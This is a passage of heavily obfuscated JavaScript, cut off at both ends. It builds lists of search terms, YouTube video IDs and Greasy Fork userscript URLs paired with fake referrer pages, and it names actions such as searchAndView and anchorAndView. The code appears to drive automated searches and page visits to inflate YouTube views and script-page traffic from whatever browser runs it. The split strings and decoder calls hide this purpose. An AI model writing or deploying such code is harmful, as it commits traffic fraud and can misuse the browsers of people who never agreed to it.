'\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + V(0x8) + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1b * 0x81 + -0x12 * -0x1b + -0xf77 * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x105d * -0x1 + -0x294 + 0x495 * -0x3)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + U(0x11, '&tV$') + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x2e4 + 0x1e25 * -0x1 + -0x14 * -0x15d);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    V(0x5) + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    W(0x4) + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + W(0x13) + 'anonymous-' + U(0xd, 'RW!G'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + V(0x9) + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + W(0x17),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': U(0x1a, 'lcKt') + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0xa) + 'e/*'
    },
    {
      'url': W(0xb) + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + V(0x14) + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
